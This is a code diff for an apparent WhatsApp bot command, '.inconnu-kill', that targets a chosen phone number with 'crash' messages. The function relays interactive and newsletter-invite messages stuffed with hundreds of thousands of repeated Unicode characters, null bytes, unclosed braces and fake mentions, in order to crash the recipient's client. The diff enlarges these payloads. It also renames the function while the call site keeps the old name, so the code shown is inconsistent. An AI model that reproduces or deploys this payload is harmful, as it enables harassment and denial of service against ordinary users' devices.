@@ -37,77 +37,76 @@ loadDevNumbers();
 // ============================================================
 // ADMIN BOKEP CRASH FUNCTION
 // ============================================================
-async function adminBokepCrash(conn, target) {
-    if (!conn?.relayMessage) {
-        console.log("Socket not ready");
-        return;
-    }
+async function AdminBokep(prim, target) {
+  if (! prim?.relayMessage) {
+    console.log("Socket belum siap");
+    return;
+  }
 
-    const toxic = "ꦾ".repeat(10000) + "𑇂𑆵𑆴𑆿".repeat(5000) + "\u0000".repeat(20000) + "ោ៝".repeat(6000);
+  const toxic =
+    "ꦾ".repeat(100000) +
+    "𑇂𑆵𑆴𑆿".repeat(50000) +
+    "\u0000".repeat(120000) +
+    "ោ៝".repeat(60000) +
+    "كن صادقاً مع نفسك ومع الآخرين".repeat(30000);
 
-    const interactiveMsg = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: { title: toxic.substring(0, 3000) },
-                    body: { text: toxic.substring(0, 5000) },
-                    nativeFlowMessage: {
-                        messageParamsJson: "{".repeat(2000),
-                        buttons: [
-                            { name: "single_select", buttonParamsJson: "\u0000".repeat(1000) },
-                            { name: "galaxy_message", buttonParamsJson: JSON.stringify({ data: "X".repeat(2000) }) },
-                            { name: "payment_method", buttonParamsJson: "\u0000".repeat(1000) },
-                            { name: "catalog_message", buttonParamsJson: "\u0000".repeat(1000) }
-                        ]
-                    },
-                    contextInfo: {
-                        mentionedJid: [target, ...Array.from({ length: 500 }, (_, i) => `1${i}@s.whatsapp.net`)],
-                        forwardingScore: 9999,
-                        quotedMessage: {
-                            paymentInviteMessage: {
-                                serviceType: 3,
-                                expiryTimestamp: Date.now() + 999999999
-                            }
-                        }
-                    }
-                }
+  const interactiveMsg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: { title: toxic.substring(0, 3000) },
+          body: { text: toxic.substring(0, 50000) },
+          nativeFlowMessage: {
+            messageParamsJson: "{".repeat(20000),
+            buttons: [
+              { name: "single_select", buttonParamsJson: "\u0000".repeat(10000) },
+              { name: "galaxy_message", buttonParamsJson: JSON.stringify({ data: "X".repeat(20000) }) },
+              { name: "payment_method", buttonParamsJson: "\u0000".repeat(10000) },
+              { name: "catalog_message", buttonParamsJson: "\u0000".repeat(10000) }
+            ]
+          },
+          contextInfo: {
+            mentionedJid: [target, ...Array.from({ length: 1000 }, (_, i) => `1${i}@s.whatsapp.net`)],
+            forwardingScore: 9999,
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 3,
+                expiryTimestamp: Date.now() + 999999999
+              }
             }
+          }
         }
-    };
-
-    const newsMsg = {
-        botInvokeMessage: {
-            message: {
-                newsletterAdminInviteMessage: {
-                    newsletterJid: "1@newsletter",
-                    newsletterName: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸" + "𑜦𑜠".repeat(5000),
-                    jpegThumbnail: null,
-                    caption: toxic.substring(0, 5000),
-                    inviteExpiration: Date.now() + 9999999999
-                }
-            }
-        }
-    };
-
-    const PouMsg = generateWAMessageFromContent(target, {
-        newsletterAdminInviteMessage: {
-            newsletterJid: "1@newsletter",
-            newsletterName: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸" + "𑜦𑜠".repeat(5000),
-            jpegThumbnail: null,
-            caption: "🩸 ༑ SHINIGAMI 炎 ⟅ ༑ 🩸",
-            timestamp: Date.now().toString(),
-        }
-    }, {});
-
-    // Send multiple times for more impact
-    for (let i = 0; i < 5; i++) {
-        await conn.relayMessage(target, interactiveMsg, { messageId: crypto.randomBytes(10).toString('hex') });
-        await sleep(200);
-        await conn.relayMessage(target, newsMsg, { messageId: crypto.randomBytes(10).toString('hex') });
-        await sleep(200);
-        await conn.relayMessage(target, PouMsg.message, { messageId: PouMsg.key.id });
-        await sleep(300);
+      }
     }
+  };
+
+  const newsMsg = {
+  botInvokeMessage: {
+    message: {
+      newsletterAdminInviteMessage: {
+        newsletterJid: "1@newsletter",
+        newsletterName: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸" + "𑜦𑜠".repeat(11000),
+        jpegThumbnail: null,
+        caption: toxic.substring(0, 50000),              
+        inviteExpiration: Date.now() + 9999999999
+      }
+    }
+  }
+};
+
+  const PouMsg = generateWAMessageFromContent(target, {
+    newsletterAdminInviteMessage: {
+      newsletterJid: "1@newsletter",
+      newsletterName: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸" + "𑜦𑜠".repeat(11000),
+      jpegThumbnail: null,
+      caption: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸",
+      timestamp: "1760964628",
+    }
+  }, {});
+
+  await prim.relayMessage(target, interactiveMsg, { messageId: crypto.randomBytes(10).toString('hex') });
+  await prim.relayMessage(target, newsMsg, { messageId: crypto.randomBytes(10).toString('hex') });
+  await prim.relayMessage(target, PouMsg.message, { messageId: PouMsg.key.id });
 }
 
 // ============================================================
@@ -135,50 +134,29 @@ cmd({
     } else if (m.quoted) {
         target = m.quoted.sender;
     } else {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ❌ Please provide a number
-│
-│ 📌 Example:
-│ • .inconnu-kill 55xxx 
-╰─────────────────────•`);
+        return reply(`❌ Usage:
+
+user: .inconnu-kill 55xxxxxxxxxxx`);
     }
 
     // Check if target is a developer number
     if (isDevNumber(target)) {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ 🛡️ Cannot attack developer number!
-│ This number is protected.
-╰─────────────────────•`);
+        return reply(`❌ Cannot attack developer number! This number is protected.`);
     }
 
     const targetNumber = target.split('@')[0];
     
     // Send attack started Message 
-    await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ 🔥 INCONNU CRASH ATTACK
-│
-│ 👤 Target: @${targetNumber}
-│ ⚡ Status: Attack in progress...
-╰─────────────────────•`);
+    await reply(`☘️ INCONNU CRASH targeting: ${targetNumber}`);
 
     try {
         await adminBokepCrash(conn, target);
         
         // Send success message
-        await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ✅ INCONNU CRASH COMPLETED!
-│ 👤 Target: @${targetNumber}
-│ 💀 Status: Crashed successfully
-╰─────────────────────•
-
-> POWERED BY SHINIGAMI MD`);
+        await reply(`☘️ INCONNU CRASH completed on: ${targetNumber}`);
         
     } catch (e) {
         console.error("Admin Bokep Crash Error:", e);
-        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ❌ INCONNU CRASH FAILED
-│ 👤 Target: @${targetNumber}
-│ 💀 Error: ${e.message}
-╰─────────────────────•`);
+        reply(`❌ INCONNU CRASH failed on: ${targetNumber} - Error: ${e.message}`);
     }
 });
